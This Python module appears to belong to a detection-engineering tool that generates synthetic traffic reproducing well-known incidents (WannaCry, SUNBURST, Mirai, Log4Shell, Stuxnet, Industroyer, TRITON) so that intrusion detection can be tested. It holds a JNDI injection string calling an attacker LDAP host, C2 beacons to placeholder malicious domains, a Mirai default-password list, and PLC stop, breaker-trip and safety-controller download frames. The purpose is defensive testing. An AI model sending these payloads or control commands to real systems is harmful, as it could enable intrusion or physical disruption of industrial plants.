"""Famous IT/OT incident scenarios — detection-test threat traffic.

Each incident reproduces the *network-visible signatures* a monitoring tool
(Claroty CTD, Zeek, Suricata, an IDS) would use to detect the real attack —
themed hostnames, the ports/protocols abused, scan and C2-beacon patterns, and
public IOC domains — so you can validate that your analyser fires on them.

This is **detection-test traffic only**: the payloads are synthetic and carry
the recognizable indicators, not working exploits, shellcode, or malware. Use it
on your own isolated test SPAN, for authorized detection engineering.

Bring your own real capture instead? Use ``tgt run --replay file.pcap``.
"""
from __future__ import annotations

import struct
from dataclasses import dataclass
from typing import Callable, Dict, List, Tuple

from . import packet as P
from .enterprise import FINGERPRINTS, Host, OUI_ROCKWELL, OUI_SIEMENS, OUI_WIN
from .packet import Endpoints
from .protocols import TcpSession, _sport, _tcp_flow

AttackBuilder = Callable[[Endpoints, int], List[bytes]]


# ---------------------------------------------------------------------------
# Attack traffic builders (signature-bearing, synthetic)
# ---------------------------------------------------------------------------
def port_scan(ep: Endpoints, count: int) -> List[bytes]:
    """TCP SYN scan: one source hitting many ports (reconnaissance)."""
    ports = ep.meta.get("scan_ports",
                        [21, 22, 23, 80, 135, 139, 443, 445, 3389, 502, 102])
    frames = []
    for i in range(max(count, 1)):
        for k, dport in enumerate(ports):
            sport = _sport()
            syn = P.tcp(ep.client_ip, ep.server_ip, sport, dport,
                        1000 + i, 0, P.SYN)
            frames.append(P.ip_frame(ep, True, P.IPPROTO_TCP, syn))
            # closed → RST/ACK back
            rst = P.tcp(ep.server_ip, ep.client_ip, dport, sport,
                        0, 1001 + i, P.RST | P.ACK)
            frames.append(P.ip_frame(ep, False, P.IPPROTO_TCP, rst))
    return frames


def smb_eternalblue(ep: Endpoints, count: int) -> List[bytes]:
    """SMBv1 (445) negotiate + Trans2 with the ETERNALBLUE/DOUBLEPULSAR
    signature (SMBv1 'NT LM 0.12', Trans2 SESSION_SETUP subcmd 0x000e,
    multiplex id 0x0052) that IDS rules flag for MS17-010."""
    def nb(p): return b"\x00" + struct.pack("!I", len(p))[1:] + p
    exchanges = []
    for i in range(count):
        neg = (b"\xffSMB\x72\x00\x00\x00\x00\x18\x53\xc8" + bytes(20) +
               struct.pack("<BH", 0, 12) + b"\x02NT LM 0.12\x00")
        # Trans2 request, SESSION_SETUP (0x000e), Multiplex ID 82 (0x0052)
        trans2 = (b"\xffSMB\x32\x00\x00\x00\x00\x18\x07\xc0" + bytes(12) +
                  struct.pack("<HH", 0, 0x0052) +          # TID, MID=82
                  b"\x0f\x0c\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
                  struct.pack("<H", 0x000e))               # subcommand
        exchanges.append((nb(neg), nb(neg[:33])))
        exchanges.append((nb(trans2), nb(trans2[:40])))
    return _tcp_flow(ep, _sport(), 445, exchanges)


def c2_beacon(ep: Endpoints, count: int) -> List[bytes]:
    """Regular-interval HTTP beacon to a C2 host (implant check-in)."""
    domain = ep.meta.get("domain", "cdn-analytics.evil.example")
    ua = ep.meta.get("ua", "Mozilla/5.0 (Windows NT 6.1) TGT-implant")
    uri = ep.meta.get("uri", "/api/v2/updates")
    exchanges = []
    for i in range(count):
        tok = f"{(i * 2654435761) & 0xffffffff:08x}"
        req = (f"GET {uri}?id={tok} HTTP/1.1\r\nHost: {domain}\r\n"
               f"User-Agent: {ua}\r\nAccept: */*\r\n"
               f"Cookie: session={tok}{tok}\r\n\r\n").encode()
        resp = (b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
                b"Content-Length: 4\r\n\r\n" + bytes([i & 0xff]) * 4)
        exchanges.append((req, resp))
    return _tcp_flow(ep, _sport(), 80, exchanges)


def dga_dns(ep: Endpoints, count: int) -> List[bytes]:
    """DNS lookups of IOC / DGA domains (kill-switch, C2, beacon)."""
    domains = ep.meta.get("domains", ["malware-c2.example"])

    def qname(name: str) -> bytes:
        return b"".join(bytes([len(p)]) + p.encode()
                        for p in name.split(".")) + b"\x00"

    frames = []
    for i in range(max(count, len(domains))):
        name = domains[i % len(domains)]
        tid = (i + 1) & 0xFFFF
        q = qname(name) + struct.pack("!HH", 1, 1)
        query = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + q
        frames.append(P.udp_frame(ep, True, _sport(), 53, query, ident=i))
        # NXDOMAIN response (typical for DGA / sinkholed IOC)
        resp = struct.pack("!HHHHHH", tid, 0x8183, 1, 0, 0, 0) + q
        frames.append(P.udp_frame(ep, False, 53, _sport(), resp, ident=i))
    return frames


def telnet_brute(ep: Endpoints, count: int) -> List[bytes]:
    """Telnet (23) default-credential brute force (Mirai-style IoT)."""
    creds = ep.meta.get("creds", [("root", "xc3511"), ("admin", "admin"),
                                  ("root", "12345"), ("root", "vizxv")])
    exchanges = []
    for i in range(count):
        u, pw = creds[i % len(creds)]
        exchanges.append((f"{u}\r\n".encode(),
                          b"Password: "))
        exchanges.append((f"{pw}\r\n".encode(),
                          b"Login incorrect\r\n"))
    return _tcp_flow(ep, _sport(), 23, exchanges)


def log4shell(ep: Endpoints, count: int) -> List[bytes]:
    """HTTP request carrying a JNDI lookup string (Log4Shell / CVE-2021-44228)."""
    lhost = ep.meta.get("lhost", ep.client_ip)
    exchanges = []
    for i in range(count):
        jndi = f"${{jndi:ldap://{lhost}:1389/Exploit{i}}}"
        req = (f"GET / HTTP/1.1\r\nHost: {ep.server_ip}\r\n"
               f"User-Agent: {jndi}\r\nX-Api-Version: {jndi}\r\n"
               "Accept: */*\r\n\r\n").encode()
        resp = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok"
        exchanges.append((req, resp))
    return _tcp_flow(ep, _sport(), 80, exchanges)


def s7_control(ep: Endpoints, count: int) -> List[bytes]:
    """S7comm (102) PLC control — STOP CPU + program download (Stuxnet-style
    manipulation of a Siemens PLC, not just read/monitor)."""
    def tpkt(p): return struct.pack("!BBH", 0x03, 0x00, 4 + len(p)) + p
    cotp = struct.pack("!BBB", 2, 0xF0, 0x80)
    exchanges = []
    for i in range(count):
        # S7 job, PLC STOP (function 0x29) then program download (0x1a)
        stop = struct.pack("!BBHHHH", 0x32, 0x01, 0, (i + 1) & 0xFFFF, 16, 0) + \
            b"\x29\x00\x00\x00\x00\x00\x00\x09P_PROGRAM"
        ack = struct.pack("!BBHHHHBB", 0x32, 0x03, 0, (i + 1) & 0xFFFF, 2, 0,
                          0, 0)
        exchanges.append((tpkt(cotp + stop), tpkt(cotp + ack)))
    return _tcp_flow(ep, _sport(), 102, exchanges)


def iec104_command(ep: Endpoints, count: int) -> List[bytes]:
    """IEC 60870-5-104 (2404) control commands — breaker single/double
    commands (type 45/46, activation) as in Industroyer/CrashOverride."""
    def apci_i(tx, rx, asdu):
        return struct.pack("<BB", 0x68, 4 + len(asdu)) + \
            struct.pack("<HH", (tx << 1) & 0xFFFF, (rx << 1) & 0xFFFF) + asdu
    exchanges = []
    tx = rx = 0
    for i in range(count):
        ioa = 0x1001 + i
        # C_SC_NA_1 (45) single command, COT=6 (activation), SCS=1 (close/trip)
        asdu = struct.pack("<BBBH", 45, 0x01, 0x06, 1) + \
            struct.pack("<BH", ioa & 0xFF, (ioa >> 8) & 0xFFFF) + \
            struct.pack("<B", 0x01)
        # C_DC_NA_1 (46) double command as ack-back
        ack = struct.pack("<BBBH", 46, 0x01, 0x07, 1) + \
            struct.pack("<BH", ioa & 0xFF, (ioa >> 8) & 0xFFFF) + \
            struct.pack("<B", 0x02)
        exchanges.append((apci_i(tx, rx, asdu), apci_i(rx, tx, ack)))
        tx += 1
        rx += 1
    return _tcp_flow(ep, _sport(), 2404, exchanges)


def tristation(ep: Endpoints, count: int) -> List[bytes]:
    """TriStation (UDP 1502) to a Schneider Triconex safety controller
    (TRITON/TRISIS — manipulating a Safety Instrumented System)."""
    frames = []
    for i in range(count):
        # TriStation command: function 0x05 (get CP status) / 0x0d (download)
        fn = 0x0D if i % 3 == 0 else 0x05
        req = struct.pack("<HHH", fn, i & 0xFFFF, 0) + b"TRISTATION" + \
            struct.pack("<H", i & 0xFFFF)
        frames.append(P.udp_frame(ep, True, _sport(), 1502, req, ident=i))
        resp = struct.pack("<HHH", fn | 0x8000, i & 0xFFFF, 0) + b"TRICONEX"
        frames.append(P.udp_frame(ep, False, 1502, _sport(), resp, ident=i))
    return frames


ATTACKS: Dict[str, Tuple[AttackBuilder, str]] = {
    "port-scan": (port_scan, "TCP SYN reconnaissance sweep"),
    "eternalblue": (smb_eternalblue, "SMBv1 MS17-010 / DOUBLEPULSAR signature"),
    "c2-beacon": (c2_beacon, "HTTP C2 implant check-in"),
    "dga-dns": (dga_dns, "IOC / DGA domain lookups"),
    "telnet-brute": (telnet_brute, "Telnet default-credential brute force"),
    "log4shell": (log4shell, "JNDI lookup in HTTP (CVE-2021-44228)"),
    "s7-control": (s7_control, "S7comm PLC STOP + program download"),
    "iec104-command": (iec104_command, "IEC-104 breaker control commands"),
    "tristation": (tristation, "TriStation writes to a Triconex SIS"),
}


# ---------------------------------------------------------------------------
# Incident definitions
# ---------------------------------------------------------------------------
# Flow: (attacker_name, victim_name, attack_key, meta_overrides)
Flow = Tuple[str, str, str, dict]


@dataclass
class Incident:
    key: str
    name: str
    category: str      # IT | OT
    year: str
    desc: str
    hosts: List[Host]
    flows: List[Flow]

    def host(self, name: str) -> Host:
        return next(h for h in self.hosts if h.name == name)

    def _endpoints(self, a: Host, v: Host, meta: dict) -> Endpoints:
        m = {"ua": a.fp.ua, "smb": "smb1", "host": v.name}
        m.update(meta)
        return Endpoints(client_mac=a.mac, client_ip=a.ip,
                         server_mac=v.mac, server_ip=v.ip,
                         ttl_client=a.fp.ttl, ttl_server=v.fp.ttl, meta=m)

    def build(self, messages: int) -> List[Tuple[str, bytes]]:
        streams: List[List[Tuple[str, bytes]]] = []
        for aname, vname, atk, meta in self.flows:
            ep = self._endpoints(self.host(aname), self.host(vname), meta)
            builder = ATTACKS[atk][0]
            frames = builder(ep, max(1, messages))
            streams.append([(atk, f) for f in frames])
        out: List[Tuple[str, bytes]] = []
        i = 0
        while any(i < len(s) for s in streams):
            for s in streams:
                if i < len(s):
                    out.append(s[i])
            i += 1
        return out

    def indicators(self) -> List[str]:
        return sorted({ATTACKS[f[2]][1] for f in self.flows})


def _h(name, ip, role, os_, oui=OUI_WIN, product=""):
    n = sum(bytes(name, "ascii")) & 0xFFFF
    return Host(name, ip, f"{oui}:{(n >> 8) & 0xFF:02x}:{n & 0xFF:02x}:"
                f"{len(name) & 0xFF:02x}", role, os_, product=product)


INCIDENTS: Dict[str, Incident] = {}


def _reg(inc: Incident):
    INCIDENTS[inc.key] = inc


# ---- IT incidents ----------------------------------------------------------
_reg(Incident("wannacry", "WannaCry", "IT", "2017",
    "Ransomware worm spreading via SMBv1 EternalBlue (MS17-010): 445 scan, "
    "SMBv1 exploit signature, and the famous kill-switch domain lookup.",
    [_h("WANNACRY-PATIENT0", "10.20.20.66", "ws", "win7"),
     _h("WS-FINANCE", "10.20.20.41", "ws", "win7"),
     _h("WS-HR", "10.20.20.42", "ws", "winxp"),
     _h("FILESRV01", "10.20.10.13", "file", "win2019"),
     _h("DNS01", "10.20.10.12", "dns", "win2019")],
    [("WANNACRY-PATIENT0", "WS-FINANCE", "port-scan", {"scan_ports": [445]}),
     ("WANNACRY-PATIENT0", "WS-FINANCE", "eternalblue", {}),
     ("WANNACRY-PATIENT0", "WS-HR", "eternalblue", {}),
     ("WANNACRY-PATIENT0", "FILESRV01", "eternalblue", {}),
     ("WANNACRY-PATIENT0", "DNS01", "dga-dns", {"domains": [
        "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"]})]))

_reg(Incident("sunburst", "SUNBURST (SolarWinds)", "IT", "2020",
    "Supply-chain backdoor in SolarWinds Orion: DGA subdomain lookups under "
    "avsvmcloud.com followed by low-and-slow HTTP C2 beaconing.",
    [_h("SW-ORION", "10.20.10.55", "web", "win2019"),
     _h("ORION-C2", "10.20.10.200", "web", "linux"),
     _h("DNS01", "10.20.10.12", "dns", "win2019")],
    [("SW-ORION", "DNS01", "dga-dns", {"domains": [
        "7gr7f1q8p0k5q2.appsync-api.us-east-1.avsvmcloud.com",
        "3mn5v9x2c1z8b4.appsync-api.eu-west-1.avsvmcloud.com"]}),
     ("SW-ORION", "ORION-C2", "c2-beacon", {
        "domain": "avsvmcloud.com", "uri": "/swip/upd/",
        "ua": "Mozilla/5.0 (Windows NT 10.0) SolarWinds.BusinessLayerHost"})]))

_reg(Incident("conficker", "Conficker", "IT", "2008",
    "Worm exploiting MS08-067 over SMB (445) with a domain-generation "
    "algorithm for C2 rendezvous.",
    [_h("CONFICKER-HOST", "10.20.20.77", "ws", "win2000"),
     _h("WS-LAB", "10.20.20.43", "ws", "winxp"),
     _h("DNS01", "10.20.10.12", "dns", "win2019")],
    [("CONFICKER-HOST", "WS-LAB", "port-scan", {"scan_ports": [445, 139]}),
     ("CONFICKER-HOST", "WS-LAB", "eternalblue", {}),
     ("CONFICKER-HOST", "DNS01", "dga-dns", {"domains": [
        "vwxyzabcd.info", "qwertyuiop.biz", "mnbvcxzlkj.org"]})]))

_reg(Incident("mirai", "Mirai Botnet", "IT", "2016",
    "IoT botnet spreading by scanning Telnet (23) with default credentials, "
    "then reporting to its C2.",
    [_h("MIRAI-BOT", "10.20.30.10", "ws", "linux"),
     _h("IPCAM-01", "10.20.30.51", "ws", "linux"),
     _h("DVR-02", "10.20.30.52", "ws", "linux"),
     _h("MIRAI-C2", "10.20.30.200", "web", "linux")],
    [("MIRAI-BOT", "IPCAM-01", "telnet-brute", {}),
     ("MIRAI-BOT", "DVR-02", "telnet-brute", {}),
     ("MIRAI-BOT", "MIRAI-C2", "c2-beacon", {
        "domain": "report.mirai-c2.example", "uri": "/bot/report"})]))

_reg(Incident("log4shell", "Log4Shell", "IT", "2021",
    "CVE-2021-44228: JNDI lookup strings injected into HTTP headers of a "
    "public web app to trigger a callback.",
    [_h("ATTACKER", "203.0.113.10", "ws", "linux"),
     _h("WEBAPP01", "10.20.10.55", "web", "linux")],
    [("ATTACKER", "WEBAPP01", "log4shell", {"lhost": "203.0.113.10"}),
     ("ATTACKER", "WEBAPP01", "port-scan", {"scan_ports": [80, 443, 8080]})]))

# ---- OT incidents ----------------------------------------------------------
_reg(Incident("stuxnet", "Stuxnet", "OT", "2010",
    "Sabotage of Siemens S7 PLCs at Natanz: SMBv1 propagation and S7comm "
    "PLC STOP + malicious program download from a compromised engineering WS.",
    [_h("STEP7-ENGWS", "172.16.2.50", "eng", "win7"),
     _h("WINCC-SCADA", "172.16.2.51", "web", "winxp"),
     _h("PLC-S7-417", "172.16.2.21", "plc", "siemens", OUI_SIEMENS,
        "6ES7 417-4XT05-0AB0")],
    [("STEP7-ENGWS", "WINCC-SCADA", "eternalblue", {}),
     ("STEP7-ENGWS", "PLC-S7-417", "s7-control", {}),
     ("WINCC-SCADA", "PLC-S7-417", "s7-control", {})]))

_reg(Incident("industroyer", "Industroyer / CrashOverride", "OT", "2016",
    "Attack on the Ukrainian power grid: IEC 60870-5-104 breaker control "
    "command storm to trip substation breakers.",
    [_h("INDUSTROYER-C2", "172.16.0.200", "web", "linux"),
     _h("SUBSTATION-HMI", "172.16.0.30", "hmi", "win7"),
     _h("RTU-104", "172.16.1.30", "plc", "siemens", OUI_SIEMENS)],
    [("SUBSTATION-HMI", "RTU-104", "iec104-command", {}),
     ("INDUSTROYER-C2", "SUBSTATION-HMI", "c2-beacon", {
        "domain": "195.16.88.6", "uri": "/xmlrpc"})]))

_reg(Incident("triton", "TRITON / TRISIS", "OT", "2017",
    "Attack on a Schneider Triconex Safety Instrumented System via the "
    "TriStation protocol (UDP 1502) from a compromised engineering station.",
    [_h("TRITON-ENGWS", "172.16.0.60", "eng", "win7"),
     _h("SIS-TRICONEX", "172.16.3.10", "plc", "rockwell", OUI_ROCKWELL,
        "Triconex 3008")],
    [("TRITON-ENGWS", "SIS-TRICONEX", "tristation", {}),
     ("TRITON-ENGWS", "SIS-TRICONEX", "port-scan",
      {"scan_ports": [1502, 1500, 502]})]))


def get(key: str) -> Incident:
    return INCIDENTS[key]


def all_incidents() -> List[Incident]:
    return list(INCIDENTS.values())
